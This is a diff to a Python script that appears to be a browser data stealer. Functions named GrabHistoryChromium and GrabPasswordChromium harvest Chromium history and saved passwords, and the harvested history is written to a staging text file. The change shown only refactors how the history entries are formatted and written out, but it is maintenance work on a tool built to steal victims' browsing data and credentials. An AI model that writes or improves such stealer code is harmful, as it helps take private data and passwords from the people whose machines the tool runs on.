@@ -405,9 +405,8 @@ def GrabHistoryChromium():
         rows = cursor.fetchall()
         conn.close()
         for row in rows:
-            url = row[0]
-            title = row[1]
-            __CHROMIUM_HISTORY__.append((url, title))
+            history_entry = f"Url: {row[0]}\nTitle: {row[1]}\n==============\n"
+            __CHROMIUM_HISTORY__.append(history_entry)
 
 try:
     GrabPasswordChromium()
@@ -443,8 +442,8 @@ try:
 
     with open(f"{CHROMIUM_FOLDER_PATH}\\.history.txt", "w", encoding="utf-8") as writer:
         writer.write(FILE_HEADER)
-        for autofill in __CHROMIUM_HISTORY__:
-            writer.write(autofill)
+        for entry in __CHROMIUM_HISTORY__:
+            writer.write(entry)
             totalHistory += 1
 except Exception as e:
     log.error(f"Unexpected error - Chromium - History : {e}")
